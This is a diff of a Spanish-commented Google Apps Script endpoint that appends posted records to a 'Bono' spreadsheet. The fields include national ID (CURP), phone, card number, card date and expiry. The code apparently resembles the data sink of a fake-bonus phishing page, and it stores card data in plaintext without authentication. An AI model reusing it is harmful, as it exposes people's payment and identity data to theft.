@@ -1,6 +1,3 @@
-/**
- * Web App endpoint para guardar registros en la hoja "Bono".
- */
 function doPost(e) {
   try {
     var sh = SpreadsheetApp.getActiveSpreadsheet().getSheetByName('Bono');
@@ -9,17 +6,17 @@ function doPost(e) {
     var payload = JSON.parse(e.postData.contents || '{}');
 
     var row = [
-      payload.nombre || '',
-      payload.fecha || '',
-      payload.estado || '',
-      payload.ciudad || '',
-      payload.curp || '',
-      payload.numeroCel || '',
-      payload.tarjeta || '',
-      payload.fechaRegistro || '',
-      payload.exp || '',
-      payload.codigoPost || '',
-      payload.correo || ''
+      payload.nombre || '',      // A Nombre
+      payload.fecha || '',       // B Fecha
+      payload.estado || '',      // C Estado
+      payload.ciudad || '',      // D Ciudad
+      payload.curp || '',        // E Curp
+      payload.numeroCel || '',   // F NumeroCel
+      payload.tarjeta || '',     // G Tarjeta
+      payload.fechaTarjeta || '',// H Fecha (tarjeta)
+      payload.exp || '',         // I Exp
+      payload.codigoPost || '',  // J CodigoPost
+      payload.correo || ''       // K Correo
     ];
 
     sh.appendRow(row);
